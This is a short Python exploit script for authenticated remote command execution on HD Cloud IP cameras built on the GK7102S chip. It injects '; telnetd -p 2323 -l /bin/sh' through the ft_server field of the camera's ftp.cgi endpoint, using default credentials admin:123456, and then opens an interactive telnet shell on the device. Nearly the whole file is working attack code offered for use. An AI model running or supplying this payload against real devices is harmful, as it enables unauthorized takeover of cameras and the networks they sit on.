#!/usr/bin/env python3
#Name: Authenticated RCE HD Cloud IP Camera
#Author: Javier Baratech
#Description: Simple script to inject command into HD Cloud IP Camera based on GK7102S.

from distutils.log import error
from urllib import request
import requests
import argparse,textwrap
import urllib.parse
import telnetlib
import random
import string
import sys
from requests.auth import HTTPDigestAuth
from requests import status_codes

parser = argparse.ArgumentParser(description="Authenticated RCE HD Cloud IP Camera GK7102S", formatter_class=argparse.RawTextHelpFormatter)                     
group_must = parser.add_argument_group('must arguments')
group_must.add_argument("-i","--ip", help="Cloud IP Camera Target IP (Example: 192.168.1.100)",required=True) 
parser.add_argument("-c","--credentials", help="Login credentials  [default] admin:123456", default="admin:123456",required=False) 

args = parser.parse_args()

if len(sys.argv) <= 2:
    print ("Exploit Usage: ./exploit.py -h [help] -u [url]")          
    sys.exit()

IP = args.ip
CREDENTIALS = args.credentials.split(':')
random_char = random.choice(string.ascii_letters)
payload = '; telnetd -p 2323 -l /bin/sh'
enconded_payload = urllib.parse.quote_plus(payload)

injection_url = 'http://{}/hy-cgi/ftp.cgi?cmd=setftpattr&ft_server={}&ft_dirname={}'.format(IP,enconded_payload,random_char)

try:
    print("[*] Trying to inject command...")
    r = requests.get(injection_url, auth=HTTPDigestAuth(CREDENTIALS[0],CREDENTIALS[1]), timeout=10)
    r.raise_for_status()
except requests.exceptions.HTTPError as error:
    raise SystemExit(error)

print("[*] Command Injection successfully completed!")

try: 
    print('[*] Opening telnet session...')
    session = telnetlib.Telnet(IP,port=2323,timeout=5)
except:
    print("[*] Failed to connect through Telnet")

session.interact()